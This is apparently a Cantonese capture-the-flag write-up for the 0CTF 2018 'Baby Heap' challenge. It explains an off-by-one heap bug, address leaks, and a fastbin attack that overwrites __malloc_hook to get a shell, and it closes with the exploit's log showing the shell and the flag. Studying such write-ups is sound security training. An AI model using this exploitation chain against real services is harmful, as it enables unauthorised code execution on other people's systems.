# Baby Heap 2018 - 183pts

題目:
>
>Let's practice the very basic [heap](babyheap.tar.gz) techniques in 2018!
>
>202.120.7.204:127


Menu:

```
   / //_// ____/ ____/ | / /  / /   /   |  / __ )
  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |
 / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /
/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/

===== Baby Heap in 2018 =====
1. Allocate
2. Update
3. Delete
4. View
5. Exit
Command: 
```

呢條係經典嘅heap題目,有齊 allocate, update, delete, view

# vulnerability:

```C
{
    printf("Size: ");
    LODWORD(v1) = sub_140A();
    v4 = v1;
    if ( (signed int)v1 > 0 )
    {
      v1 = *(_QWORD *)(24LL * v3 + a1 + 8) + 1LL;
      if ( v4 <= v1 )
      {
        printf("Content: ");
        sub_1230(*(_QWORD *)(24LL * v3 + a1 + 16), v4);
        LODWORD(v1) = printf("Chunk %d Updated\n", (unsigned int)v3);
      }
    }
    
  ```
  
係update function個到, input content會比input size讀多左1 byte 入去heap到,一個好明顯嘅 off by one bug
  
我地可以用個個 byte shrink 或者extend個 chunk

不過呢題有一個constraint,最多只可以calloc到 0x60 chunk(fast bin),而且call calloc會將舊content 清0

所以無得靠直接free unsorted bin leak libc/heap address

```C

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = sub_140A();
      if ( v2 > 0 )
      {
        if ( v2 > 0x58 )
          v2 = 0x58;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Chunk %d Allocated\n", (unsigned int)i);
      }
      return;
    }
  }
}
```
# Leak Information

係呢個情況下我地靠update n th chunk,用off by one overwrite下一個chunk(n+1 th chunk)嘅size, 再free下一個chunk(n+1 th chunk)

咁就可以將n+1 th chunk 放入unsorted bin, 之後再view n th chunk leak libc

leak heap address 可以用上面方法放多一個chunk入unsorted bin,再view 或者create一個k size fastbin,free左佢,再靠 off by one, extend一組 chunk, corrupt 包左嘅一個chunk做k size, 由於fastbin係 single linked list所以 leak到 heap address

# Exploit

我地可以free某個包住左嘅chunk 做 fastbin attack

你以為你已經get shell?? 少年你太年輕了

因為最大只可以calloc 0x60 chunk, 而要 bypass fast bin checking, calloc 去_malloc_hook附近位置,需要 calloc到 0x70 chunk

最後發現,如果heap address 開頭係0x56,我地可以靠calloc 0x60 chunk 去到main_arena紀錄current top address附近嘅位置

所以我地用fastbin attack,calloc 去main_arena+offset,edit top 做_malloc_hook附近位置,再做幾次calloc clean返之前d位,最後我地拎到 _malloc_hook,再 overwrite _malloc_hook->one gadget rce,call calloc->get shell

# Flag

```
flag{have_fun_with_fastbin}
```

logs:
```
# [+] Opening connection to 202.120.7.204 on port 127: Done
# [*] '/root/Desktop/CTF_Game/0ctf_2018/baby_heap/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Leaking heap addr
# [*] Leaked heap addr :0x562ecd700000
# [*] Leaking libc
# [*] Leaked libc :0x7f58a9390b58
# [*] Leaked libc base :0x7f58a8ff7000
# [*] __malloc_hook : 0x7f58a9390af0
# [*] __free_hook : 0x7f58a9392788
# [*] main_arena : 0x7f58a9390b00
# [*] main_arena : 0x7f58a9390b00
# [*] Hijacking main_arena
# 73
# [*] removing old 0x20 to clean up the list
# [*] starting attack :)
# [*] Switching to interactive mode
# Chunk 9 Updated
# 1. Allocate
# 2. UpdateSize: total 84
# drwxr-xr-x  22 root root  4096 Mar 14 09:48 .
# drwxr-xr-x  22 root root  4096 Mar 14 09:48 ..
# drwxr-xr-x   2 root root  4096 Mar 30 19:15 bin
# drwxr-xr-x   3 root root  4096 Mar 30 19:16 boot
# drwxr-xr-x  16 root root  2960 Mar 14 14:37 dev
# drwxr-xr-x  77 root root  4096 Mar 30 19:21 etc
# drwxr-xr-x   3 root root  4096 Mar 30 19:16 home
# lrwxrwxrwx   1 root root    29 Mar 14 09:48 initrd.img -> boot/initrd.img-4.9.0-6-amd64
# lrwxrwxrwx   1 root root    29 Mar 14 09:35 initrd.img.old -> boot/initrd.img-4.9.0-4-amd64
# drwxr-xr-x  14 root root  4096 Mar 14 09:40 lib
# drwxr-xr-x   2 root root  4096 Mar 28 21:47 lib64
# drwx------   2 root root 16384 Mar 14 09:35 lost+found
# drwxr-xr-x   3 root root  4096 Mar 14 09:35 media
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 mnt
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 opt
# dr-xr-xr-x 101 root root     0 Mar 14 14:37 proc
# drwx------   4 root root  4096 Mar 31 06:27 root
# drwxr-xr-x  17 root root   580 Mar 31 11:05 run
# drwxr-xr-x   2 root root  4096 Mar 30 19:15 sbin
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 srv
# dr-xr-xr-x  13 root root     0 Mar 31 11:43 sys
# drwx-wx-wt   8 root root  4096 Apr  1 02:17 tmp
# drwxr-xr-x  10 root root  4096 Mar 14 09:35 usr
# drwxr-xr-x  11 root root  4096 Mar 14 09:35 var
# lrwxrwxrwx   1 root root    26 Mar 14 09:48 vmlinuz -> boot/vmlinuz-4.9.0-6-amd64
# lrwxrwxrwx   1 root root    26 Mar 14 09:35 vmlinuz.old -> boot/vmlinuz-4.9.0-4-amd64
# $ cat flag
# cat: flag: No such file or directory
# $ cd home
# $ ls
# babyheap
# $ cd babyheap
# $ cat flag
# flag{have_fun_with_fastbin}
# [*] Got EOF while reading in interactive
# $  
```
